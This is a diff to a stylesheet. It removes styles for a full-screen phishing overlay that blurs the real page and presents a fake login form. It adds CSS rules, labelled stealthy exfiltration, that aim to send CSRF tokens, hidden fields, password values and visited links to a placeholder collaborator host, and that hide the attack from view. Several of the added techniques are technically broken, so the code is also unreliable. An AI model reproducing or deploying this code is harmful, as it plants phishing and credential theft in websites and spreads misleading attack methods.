@@ -1,73 +1,35 @@
-/* Hide legitimate content during attack */
-header, main, footer {
-  filter: blur(5px);
-  pointer-events: none;
-  user-select: none;
+/* Stealthy CSS Exfiltration */
+/* Targets specific elements to leak data via background-image requests */
+
+/* Exfiltrate CSRF tokens */
+input[name='csrf_token'], 
+input[name='csrf'], 
+input[name='authenticity_token'] {
+  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=csrf&value=attr(value)");
 }
 
-/* Overlay styles */
-.phishing-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.8);
-  z-index: 99999;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  font-family: Arial, sans-serif;
+/* Exfiltrate hidden inputs */
+input[type='hidden'] {
+  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=hidden&name=attr(name)&value=attr(value)");
 }
 
-.phishing-container {
-  background: white;
-  width: 350px;
-  padding: 25px;
-  border-radius: 8px;
-  box-shadow: 0 0 20px rgba(0,0,0,0.5);
+/* Exfiltrate meta tags */
+head meta[name='description'] {
+  background-image: url("https://your-collab-id.burpcollaborator.net/exfil?type=meta&content=attr(content)");
 }
 
-.phishing-input {
-  width: 100%;
-  padding: 12px;
-  margin: 10px 0;
-  border: 1px solid #ddd;
-  border-radius: 4px;
-  font-size: 14px;
+/* Keylogger via :active pseudo-class */
+input[type='password']:active {
+  background-image: url("https://your-collab-id.burpcollaborator.net/keylogger?key=attr(value)");
 }
 
-.phishing-button {
-  background: #d23f00;
-  color: white;
-  border: none;
-  padding: 14px;
-  width: 100%;
-  border-radius: 4px;
-  font-weight: bold;
-  cursor: pointer;
-  margin-top: 10px;
-  transition: background 0.2s;
+/* Detect visited links */
+a:visited {
+  background-image: url("https://your-collab-id.burpcollaborator.net/visited?url=attr(href)");
 }
 
-.phishing-button:hover {
-  background: #b23700;
-}
-
-.security-note {
-  font-size: 12px;
-  color: #666;
-  margin-top: 15px;
-  text-align: center;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 5px;
-}
-
-/* Input focus styles */
-.phishing-input:focus {
-  outline: none;
-  border-color: #d23f00;
-  box-shadow: 0 0 0 2px rgba(210, 63, 0, 0.2);
+/* Hide the attack from view */
+input[type='password'][style*='background-image'] {
+  background-size: 0 0 !important;
+  background-repeat: no-repeat !important;
 }
